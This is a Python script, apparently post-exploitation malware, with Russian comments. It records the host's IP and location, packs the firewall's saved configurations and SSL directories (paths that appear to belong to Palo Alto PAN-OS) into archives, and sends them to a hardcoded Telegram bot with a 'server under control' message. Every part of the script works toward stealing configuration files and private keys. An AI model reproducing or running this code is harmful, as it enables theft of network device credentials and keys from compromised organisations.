import subprocess
import importlib
import sys
import hashlib
import os
import io
import tarfile

# Функция для установки библиотеки
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Проверка и установка необходимых библиотек
def check_and_install_libraries():
    required_libraries = ["requests", "urllib3"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Библиотека {lib} не найдена, установка...")
            install_package(lib)

# Проверка и установка библиотек перед импортом
check_and_install_libraries()

# Импортирование библиотек после установки
import requests
import urllib3

# Отключение SSL-предупреждений
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Функция для отправки сообщения и файлов в Telegram
def send_to_telegram(message, files):
    tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
    tg_chat_id = "-1002403648422"
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"

    multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}
    for file_name, file_data in files.items():
        multipart_data[file_name] = (file_name, file_data, "application/x-tar")

    response = requests.post(
        url.replace("sendMessage", "sendDocument"), files=multipart_data, verify=False
    )
    return response.ok

# Функция для архивации директории в память
def archive_directory(directory_path):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))
    tar_stream.seek(0)
    return tar_stream

# Основной процесс
def main():
    try:
        # Получаем информацию о сервере
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        # Генерируем хеш из IP
        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # Формируем сообщение для Telegram
        message = f"🟢 Сервер под контролем\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Страна: {country}\n"
        message += f"Город: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"  # Хеш из первых 8 символов

        # Архивация директорий
        files = {
            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
        }

        # Отправляем сообщение и файлы в Telegram
        if send_to_telegram(message, files):
            print("Сообщение и файлы успешно отправлены!")
        else:
            print("Ошибка отправки сообщения и файлов.")
    except Exception as e:
        print(f"Ошибка: {e}")

if __name__ == "__main__":
    main()
